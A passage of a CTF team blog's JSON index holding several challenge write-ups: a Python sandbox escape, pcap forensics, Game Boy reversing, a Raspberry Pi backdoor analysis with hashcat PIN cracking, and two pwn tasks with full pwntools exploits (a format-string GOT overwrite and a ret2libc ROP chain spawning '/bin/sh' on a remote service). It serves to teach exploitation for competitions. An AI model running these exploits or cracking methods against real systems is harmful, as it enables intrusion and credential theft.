\").strip() if len(token) &gt; 4 or token.isdigit() != True: print \"Revise your token!\" exit() else: open = file(\"canceled-tokens.txt\", \"a\") time = datetime.now() open.writelines(\"\\nToken canceled at: %02d/%02d/%02d %02d:%02d:%02d:\\n\" % (time.month, time.day, time.year, time.hour, time.minute, time.second)) open.writelines(token) open.close() print \"This will go through by a manual inspection, thank you Mr. \" + role + \"!\" exit() else: print \"Incorrect option, please, try again!\" option = string(option) As we can see above doesn’t matter what we choose we will always exit the program so what we do here? we need to find a trick, to bypass this and still have the option “Open” as we can see in the end they are removing all \\ of the string in the final of the loop: 1234567891011class string(object): def __init__(self, string): self.string = string def strip(self): test = re.findall(r\"[\\\\\\n\\t\\r]\", self.string) for i in test: self.string = self.string.replace(i, \"\") return self.string And the calls:1234 \"Truncated code of the loop\" option = string(option)if option.strip() == \"Open\": gen() This very useful! this removes newlines or \\ characters! The regex expression that splits the string does this: If we inject O\\pen it will match the words O and pen and when we enter in the loop we won’t choose any of the options not exiting the program, after this the string class will help us getting the Open string!If we do this we will run the gen function: 1234567891011121314151617181920212223242526$ nc 200.136.213.114 4000Hello! Log on to the Token Generation SystemIf your name is not on the authorized list, a notification will be generated!For security reasons, NEVER type your literal name.Type your regex-name to identify ([^\\[\\]][A-z+]): D\\D+rHello, Vice-President![Open] - To create a new token[Revoke] - To Revoke a tokenType the option: RevokeFor security reasons, confirme your option![Open] - To create a new token[Revoke] - To Revoke a tokenType the option: O\\penIncorrect option, please, try again!Incorrect option, please, try again!Usage:gen 'token serial number'E.g.:gen 2017&gt;&gt;&gt; Bypass the Sand box and print the seed (Which was the flag)First we have some characters we can’t use: 123456789def validation(input): err = int() input = str(input) nochrs = '[&amp;*+-/34689?\\&lt;_&gt;!@#`|$%;&#123;&#125;]' if re.findall(nochrs, input): err = 1 else: err = 0 if not err: return 1 else: return 0 Analysing the regular expression we have: The characters between the range _43_ and _47_ are: We can’t use any of the characters above and there is more, we can’t use most of the built_in functions because they are being removed here: 1234567def safe(): from sys import modules modules.clear() del modules global input, compile, execfile, globals, vars, open, file, reload, __import__, locals, dir input, compile, execfile, globals, vars, locals, open, file, reload, __import__, dir = None, None, None, None, None, None, None, None, None, None, None __builtins__.dir = None We tried hard to bypass and we couldn’t do it, we knew that we needed to run raw_input(seed) this function would print the seed for us unfortunately the _ character was filtered too, so we found this function within the code: 12345def Option(): print \"[Open] - To create a new token\" print \"[Revoke] - To Revoke a token\" opt = raw_input(\"Type the option: \") return opt This is perfect if we run gen Options() it will run another raw_input without any filters and then we can inject any character we want! Here is the example how to do it:The flag was CTF-BR{fiev4zi3Nais7ue7aiSh}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"Sandbox","slug":"Pwn/Sandbox","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/"},{"name":"Python","slug":"Pwn/Sandbox/Python","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"pwn2winctf","slug":"pwn2winctf","permalink":"https://teamrocketist.github.io/tags/pwn2winctf/"},{"name":"sandbox","slug":"sandbox","permalink":"https://teamrocketist.github.io/tags/sandbox/"},{"name":"regex","slug":"regex","permalink":"https://teamrocketist.github.io/tags/regex/"}]},{"title":"[Forensics] Square CTF - Sniffed Off the Wire","slug":"Forensics-Square-CTF-Sniffed-Off-the-Wire","date":"2017-10-16T18:26:03.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/","link":"","permalink":"https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/","excerpt":"","text":"Sniffed Off the Wire🚩Sifting through the noise100 pointsForensicsAfter weeks of perching, our avian operatives captured a suspicious network flow. Maybe there’s valuable data inside?https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap We have pcap analysing it in wireshark, if we follow the tcp stream we can see alot of strange characters:This strange characters are known as terminal characters, they can do alot of things like changing the color printed in the terminal and do alot of other stuff. If we print some characters like this in the terminal with c/python/perl/ruby etc: 12345678910class bcolors: HEADER = '\\033[95m' with OKBLUE = '\\033[94m' OKGREEN = '\\033[92m' WARNING = '\\033[93m' FAIL = '\\033[91m' ENDC = '\\033[0m' BOLD = '\\033[1m' UNDERLINE = '\\033[4m'print bcolors.WARNING + \"Warning: No active frommets remain. Continue?\" + bcolors.ENDC It’s going to print the text as yellow in the terminal, those characters on wireshark will do same but with another functions not just changing the color, first we need to decode all this hex decimal in the data field of each TCP package:Lets use bash to get all the hexadecimal and convert it to text: 1tshark -r sniffed-off-the-wire.pcap -Y \"data\" -Tfields -e data.data | tr -d ':|\\n' | xxd -r -p Those characters are actually writing the flag and then delete it, I actually needed to print-screen the terminal, with this I ended up getting the flag:","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"tshark","slug":"tshark","permalink":"https://teamrocketist.github.io/tags/tshark/"},{"name":"terminal_characters","slug":"terminal-characters","permalink":"https://teamrocketist.github.io/tags/terminal-characters/"},{"name":"squarectf","slug":"squarectf","permalink":"https://teamrocketist.github.io/tags/squarectf/"}]},{"title":"[Reverse] Square CTF - The Turing Agent","slug":"Reverse-Square-CTF-The-Turing-Agent","date":"2017-10-16T00:08:25.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/10/16/Reverse-Square-CTF-The-Turing-Agent/","link":"","permalink":"https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/","excerpt":"","text":"The Turing AgentA Small Gameboy CTF500 pointsReverseThe hamsters have triumphed! We found an open Github repository (https://github.com/Ahris/the_turing_agent)! It looks like some sort of game; perhaps they’re planning to trick our humans into playing it. We need to know if there’s any data hidden in the game that might harm our humans.Note: You’ll need to prepend “flag-“ to the flag. A game boy classic rom to analyse, at first I tried to search in the web for a nice debugger for this and most people online were recommending to use http://bgb.bircd.org/ classifying it as the best, well unfortunately I didn’t manage to understand this debugger very well so once again searching in the web I found a much more intuitive debugger named No$GMB (http://problemkaputt.de/gmb.htm) with this one it was much easier to solve the challenge. Opening the rom with No$GMB we can see that the game starts we get some conversation until we reach a locked door which requires a code (combination of multiple gameboy keys), if we get the correct combination we can get the flag: As you can see in the image above I put a break point at 0x337C which is a jump, I did a break point here because I noticed its some kind of a loop which will only end when all the keys are inserted to unlock the door so my plan was not to actually understand how the architecture of the gameboy works but to try to bypass the combination verification by changing the flags of jump instructions and try to find the winner function:To avoid being stuck in the loop without pressing any keys we can just disable the carry flag and it will not jump as we can see in the image bellow the “[]” disappears:This is how I manipulated the game, by changing the control flow of the program to try to jump into a winner function, after multiple steps I ended up in the final road to finish the challenge as you can see bellow:By going to the next lines of the conversation we got the flag:","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"squarectf","slug":"squarectf","permalink":"https://teamrocketist.github.io/tags/squarectf/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"gameboy","slug":"gameboy","permalink":"https://teamrocketist.github.io/tags/gameboy/"},{"name":"no$gmb","slug":"no-gmb","permalink":"https://teamrocketist.github.io/tags/no-gmb/"}]},{"title":"[Reverse] Kaspersky Industrial CTF Quals 2017 - Backdoor Pi","slug":"Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi","date":"2017-10-08T15:00:48.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/","link":"","permalink":"https://teamrocketist.github.io/2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/","excerpt":"","text":"We are doing an project for a school competition in which we need to use a Raspberry Pi to make an IOT prototype. We received SD cards from the professor, and because we lost ours we asked another group to give us a copy of their card, I know it’s been modified because the original hash doesn’t match. Could you please investigate and tell me if everything is ok? Here is some parts of the file system:FLAG FORMAT: KLCTF{flag}download this file: https://s3.eu-central-1.amazonaws.com/klctf/fs.zip By reading the description we know the attacker added some kind of backdoor our first intuition was to check the crontab files: 12$ ls var/spool/cron/crontabs/b4ckd00r_us3r pi By checking the b4ckd00r_us3r we found out the backdoor is running in this cron task: 123456cat var/spool/cron/crontabs/b4ckd00r_us3r # DO NOT EDIT THIS FILE - edit the master and reinstall.# (/tmp/crontab.80NKS4/crontab installed on Wed Oct 4 19:28:12 2017)# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)# m h dom mon dow command@reboot python /bin/back By checking what kind of file /bin/back is: 12$ file bin/backbin/back: python 2.7 byte-compiled It’s a python compiled file we used https://github.com/wibiti/uncompyle2 to uncompyle and we got this: 123456789101112131415161718192021222324252627282930313233343536373839# uncompyle6 version 2.12.0# Python bytecode 2.7 (62211)# [GCC 6.3.0 20170118]# Embedded file name: back.py# Compiled at: 2017-10-05 09:09:10import sysimport osimport timefrom flask import Flaskfrom flask import requestfrom flask import abortimport hashlibdef check_creds(user, pincode): if len(pincode) &lt;= 8 and pincode.isdigit(): val = '&#123;&#125;:&#123;&#125;'.format(user, pincode) key = hashlib.sha256(val).hexdigest() if key == '34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e': return 'Congr4ts, you found the b@ckd00r. The fl4g is simply : &#123;&#125;:&#123;&#125;'.format(user, pincode) return abort(404)app = Flask(__name__)@app.route('/')def hello(): return '&lt;h1&gt;HOME&lt;/h1&gt;'@app.route('/backdoor')def backdoor(): user = request.args.get('user') pincode = request.args.get('pincode') return check_creds(user, pincode)if __name__ == '__main__': app.run(threaded=True, host='0.0.0.0', port=3333)# okay decompiling back.pyc We have a hash and we know it is composed in the following format: 1user:pincode Checking the user in /etc/passwd 12345678910111213141516171819202122232425262728root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shpi:x:1000:1000:,,,:/home/pi:/bin/bashsshd:x:101:65534::/var/run/sshd:/usr/sbin/nologinntp:x:102:104::/home/ntp:/bin/falsestatd:x:103:65534::/var/lib/nfs:/bin/falsemessagebus:x:104:106::/var/run/dbus:/bin/falseusbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/falselightdm:x:106:109:Light Display Manager:/var/lib/lightdm:/bin/falseavahi:x:107:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falseb4ckd00r_us3r:x:1001:1004::/home/b4ckd00r_us3r:/bin/bash The user is b4ckd00r_us3r we just need to bruteforce the pincode by looking at the code we know the pincode must be between 1 and 8 numbers using hashcat to crack the hash: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ cat kasperskyhash 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e$ cat example.dict b4ckd00r_us3r:$ hashcat -D 1,2 -m 1400 -a 6 -i --increment-min 1 --increment-max 8 kasperskyhash example.dict \"?d?d?d?d?d?d?d?d\"Session..........: hashcat Status...........: ExhaustedHash.Type........: SHA-256Hash.Target......: 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf22...ff222eTime.Started.....: Sun Oct 8 16:23:46 2017 (3 mins, 27 secs)Time.Estimated...: Sun Oct 8 16:27:13 2017 (0 secs)Guess.Base.......: File (example.dict), Left SideGuess.Mod........: Mask (?d?d?d?d?d?d?d) [7], Right SideGuess.Queue.Base.: 1/1 (100.00%)Guess.Queue.Mod..: 7/8 (87.50%)Speed.Dev.#1.....: 45759 H/s (0.29ms)Speed.Dev.#2.....: 0 H/s (0.00ms)Speed.Dev.#*.....: 45759 H/sRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) SaltsProgress.........: 10000000/10000000 (100.00%)Rejected.........: 0/10000000 (0.00%)Restore.Point....: 0/1 (0.00%)Candidates.#1....: b4ckd00r_us3r:8939393 -&gt; b4ckd00r_us3r:9579393Candidates.#2....: [Copying]HWMon.Dev.#1.....: Temp: 64c Fan: 46%HWMon.Dev.#2.....: N/ADictionary cache hit:* Filename..: example.dict* Passwords.: 1* Bytes.....: 15* Keyspace..: 100000000- Device #2: autotuned kernel-accel to 160 - Device #2: autotuned kernel-loops to 204- Device #1: autotuned kernel-accel to 22 - Device #1: autotuned kernel-loops to 23[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =&gt; The wordlist or mask that you are using is too small.This means that hashcat cannot use the full parallel power of your device(s).Unless you supply more work, your cracking speed will drop.For tips on supplying more work, see: https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted. 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:$HEX[6234636b643030725f757333723a3132313731333337]$ cat ~/.hashcat/hashcat.potfile | tail -134c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:$HEX[6234636b643030725f757333723a3132313731333337] After a while it cracks, hashcat outputs the password in hex so lets decode it with bash: 12$ echo '6234636b643030725f757333723a3132313731333337' | xxd -r -pb4ckd00r_us3r:12171337 The flag was 1KLCTF&#123;b4ckd00r_us3r:12171337&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"hashcat","slug":"hashcat","permalink":"https://teamrocketist.github.io/tags/hashcat/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"compiled","slug":"compiled","permalink":"https://teamrocketist.github.io/tags/compiled/"},{"name":"sha256","slug":"sha256","permalink":"https://teamrocketist.github.io/tags/sha256/"},{"name":"kasperskyCtf","slug":"kasperskyCtf","permalink":"https://teamrocketist.github.io/tags/kasperskyCtf/"}]},{"title":"[Reverse] BackdoorCTF 2017 - NO-CALM","slug":"Reverse-BackdoorCTF-2017-NO-CALM","date":"2017-09-26T11:09:07.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/","link":"","permalink":"https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/","excerpt":"","text":"Reverse challenge, using IDA to convert the binary into c pseudo code: We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in if check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of if verifications:We can see it checks 3 bytes at time, with 3 different operation checks: 1(v7+v6-v8 == key[0] &amp;&amp; v6-v7+v8 == key[1] &amp;&amp; v7-v6+v8 == key[2]) == true And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag: 12345678910111213import stringa = string.printablekeys = [81,53,87,90,156,66,98,140,92,38,170,60,29,161,69,163,27,69,147,43,59,146,86,44,67,89,75,117,125,125]flags = []s = ''for i in range(0,len(keys),3): for b in a: for c in a: for d in a: if ord(c)+ord(b)-ord(d) == keys[i] and ord(b)-ord(c)+ord(d) == keys[i+1] and ord(c)-ord(b)+ord(d) == keys[i+2]: s += b+c+d print s Running it: 1234567891011$ python nocalm.py CTFCTF&#123;NoCTF&#123;Now_tCTF&#123;Now_th1sCTF&#123;Now_th1s_1sCTF&#123;Now_th1s_1s_t0CTF&#123;Now_th1s_1s_t0_g3CTF&#123;Now_th1s_1s_t0_g3t_ACTF&#123;Now_th1s_1s_t0_g3t_ANGRCTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"}]},{"title":"[Pwn] BackdoorCTF 2017 - baby0x41414141","slug":"Pwn-BackdoorCTF-2017-baby0x41414141","date":"2017-09-25T04:46:07.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/","link":"","permalink":"https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/","excerpt":"","text":"1.1 - format string vulnerability. We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your name?%xOk cool, soon we will know whether you pwned it or not. Till then Bye 8048914 A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls system(&#39;cat flag.txt&#39;) so we don’t have to actually leak libc addresses and go through all that trouble:1.2 - flag function. This one is really simple: 121 - Calculate the offset of the address we put in the stack using %p.2 - Modify the exit function address with flag function using %n. Before going into an explanation I’ll show you some modifiers from printf man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that. 12345678910111213An optional length modifier, that specifies the size of the argument. The following length modifiers are valid for the d, i, n, o, u, x, or X conversion: Modifier d, i o, u, x, X n hh signed char unsigned char signed char * h short unsigned short short * l (ell) long unsigned long long * ll (ell ell) long long unsigned long long long long * j intmax_t uintmax_t intmax_t * t ptrdiff_t (see note) ptrdiff_t * z (see note) size_t (see note) q (deprecated) quad_t u_quad_t quad_t * For example if we want to override an address like this 0x0804870b this a 32 bit address so if we need to change all the bits we would use %ln which is a long and it’s 32 bits or we could even use %lln would work too since is 64 bit (long long). Usually we want to use %hn so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs 0x0804870b spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one. 120804 -&gt; '%11hn'870b -&gt; '%10hn' Stack address offset calculationWe can do this by printing a bunch of addresses from the stack using %x or %p, we can insert some ‘AAAA’ in the beginning and the a bunch of %x and check on which location the ‘AAAA’ are positioned in the stack. 123456def getConn(): return process('./32_new') if local else remote('163.172.176.29', 9035)r =getConn()r.recvuntil('Hello baby pwner, whats your name?\\n')s = 'AAAA'+ '%x,'*20r.sendline(s) We can see our 41414141 will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: 12$ python 32_new.py Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825, To access its position we can do like this: 1'%10$hn' Override exit functionNow we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this: 1'%100%10$hn' Now starting the exploit we can easily get the exit GOT address with pwntools and the flag function we can get it from radare2 you can check it at the picture 1.2 above. One nice trick is to clear the existing EXIT function address with %10$lln of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into 0x0000004e, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in gdb). 12345678910EXIT_GOT = binary.got['exit']FLAG_LOW = FLAG &amp; 0xffffFLAG_HIGH = (FLAG &amp; 0xffff0000) &gt;&gt; 16s = p32(EXIT_GOT)s += p32(EXIT_GOT+2)s += '%10$lln' # clears the already existing exit addresss += '%&#123;&#125;x%11$hn'.format(FLAG_HIGH-78)s += '%&#123;&#125;x%10$hn'.format(FLAG_LOW-FLAG_HIGH) The full exploit: 1234567891011121314151617181920212223242526from pwn import *local = Falsedef getConn(): return process('./32_new') if local else remote('163.172.176.29', 9035)r =getConn()#gdb.attach(r, '''# b *0x08048724# c''')binary = ELF('./32_new')FLAG = 0x0804870bEXIT_GOT = binary.got['exit']FLAG_LOW = FLAG &amp; 0xffffFLAG_HIGH = (FLAG &amp; 0xffff0000) &gt;&gt; 16s = p32(EXIT_GOT)s += p32(EXIT_GOT+2)s += '%10$lln' # clears the already existing exit addresss += '%&#123;&#125;x%11$hn'.format(FLAG_HIGH-78)s += '%&#123;&#125;x%10$hn'.format(FLAG_LOW-FLAG_HIGH)r.recvuntil('Hello baby pwner, whats your name?\\n')r.sendline(s)print r.recvall(timeout=1)r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Format String","slug":"Pwn/x86/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Format-String/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"}]},{"title":"[Pwn] BackdoorCTF 2017 - Justdoit","slug":"Pwn-BackdoorCTF-2017-Justdoit","date":"2017-09-25T01:57:29.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/","link":"","permalink":"https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/","excerpt":"","text":"1.1 - representation of the assembly code of the binary So we have 32 bit binary and a buffer overflow vulnerability, lets use checksec to see its protections: 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) There isn’t a stack canary protection but we have NX ENABLED so we can’t execute code in the stack we have to use Return Oriented Programming(ROP) to leak libc addresses and finally return to libc… We can check which functions are available for us using objdump: 123456789101112$ objdump -R justdoit justdoit: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__0804a00c R_386_JUMP_SLOT read@GLIBC_2.00804a010 R_386_JUMP_SLOT printf@GLIBC_2.00804a014 R_386_JUMP_SLOT __gmon_start__0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT write@GLIBC_2.0 We have write which is everything we need to do this challenge, using write we can leak addresses from the Global Offset Table (GOT) with the leaks we can calculate the offsets using the lib.so that was provided by the challenge. Here is the plan to exploit it: 1231 - Overflow the buffer2 - Using ROP to leak GOT addresses with write function and return to main3 - Overflow the buffer again and jump to system with /bin/sh as argument Overflow the bufferAccording to the assembly code at picture 1.1 the read function will read up to 200 bytes so lets use metasploit to create a 200 byte pattern: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Now lets see on each address it will break using gdb : 1234567pwndbg&gt; rStarting program: /home/evilgod/Documents/Hacking/ctf/backdoor/pwn/justdoit/justdoit Hello pwners, Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5AgProgram received signal SIGSEGV, Segmentation fault.Program received signal SIGSEGV (fault address 0x64413764) As we can see we have a page fault error at the address 0x64413764 so once again lets use metasploit to calculate the offset: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764[*] Exact match at offset 112 ROP and leak libc addresseswrite needs 3 arguments as follows: 1ssize_t write(int fildes, const void *buf, size_t nbytes); We can use pwntools to get the GOT and PLT addresses from the binary (note that you can use objdump too to achieve the same result). Memorize this if you are beginner in binary exploitation and don’t understand really well what GOT is, just remember if you want to jump and execute a function from libc you jump into PLT but if you want to leak an address from libc you get the value from the GOT address. 12345678from pwn import *binary = ELF('./justdoit')libc = ELF('libc.so.6')padding = 'A'*112WRITEPLT = binary.plt['write']PRINTFGOT = binary.got['printf']MAIN = 0x804847d # You can get this from radare2 for example Since the binary is 32 bits we don’t really need to pop stack address into specific registers like in 64 bit a simple ropchain to leak printf address can be built like this: 123456ropchain = ''ropchain += p32(WRITEPLT) # WRITE function \"call\"ropchain += p32(MAIN) # RETURN TO MAINropchain += p32(0x1) # STDIN ARG[0]ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]ropchain += p32(0x4) # BYTES TO READ ARG[2] After we send this to the server, we can calculate everything with symbols from pwntools : 123456789101112131415r = getConn()r.recvline()r.sendline(padding+ropchain)r.recv(len(padding)+len(ropchain)) # reads the printf outputPRINTF = u32(r.recv(0x4)) # leaked printf addressLIBCBASE = PRINTF - libc.symbols['printf']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x15900blog.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PRINTF 0x%x\" % PRINTF)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % BINSH) If you are wondering where I got the offset of /bin/sh string , you can use a nice trick with strings command: 12$ strings -a -t x libc.so.6 | grep '/bin/sh' 15900b /bin/sh Overflow again and jump to libcNow that we have system and /bin/sh string we can just jump into them! note that I had to readjust the padding offset (use gdb to check the values on the stack to calculate the offset): 123456789ropchain2 = p32(SYSTEM) # WRITE function \"call\"ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shellropchain2 += p32(BINSH)r.recvuntil('Hello pwners, \\n')r.sendline('A'*(112-8)+ropchain2)r.recv()r.interactive()r.close() And now the full script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *local = Truedef getConn(): return process('./justdoit', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('163.172.176.29', 9036)padding = 'A'*112binary = ELF('./justdoit')libc = ELF('libc.so.6')WRITEPLT = binary.plt['write']PRINTFGOT = binary.got['printf']MAIN = 0x804847d # You can get this from radare2 for exampleropchain = ''ropchain += p32(WRITEPLT) # PRINTF function \"call\"ropchain += p32(MAIN) # RETURN TO MAINropchain += p32(0x1) # STDIN ARG[0]ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]ropchain += p32(0x4) # BYTES TO READ ARG[2]r = getConn()#gdb.attach(r, '''# b *0x080484d8# c''')r.recvline()r.sendline(padding+ropchain)r.recv(len(padding)+len(ropchain)) # reads the printf outputPRINTF = u32(r.recv(0x4))LIBCBASE = PRINTF - libc.symbols['printf']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x15900blog.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PRINTF 0x%x\" % PRINTF)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % BINSH)ropchain2 = p32(SYSTEM) # WRITE function \"call\"ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shellropchain2 += p32(BINSH)r.recvuntil('Hello pwners, \\n')r.sendline('A'*(112-8)+ropchain2)r.recv()r.interactive()r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Stack Issue","slug":"Pwn/x86/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x86/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"ROP","slug":"ROP","permalink":"https://teamrocketist.github.io/tags/ROP/"},{"name":"retToLibc","slug":"retToLibc","permalink":"https://teamrocketist.github.io/tags/retToLibc/"},{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"}]},{"title":"[Forensics] CSAW - Best 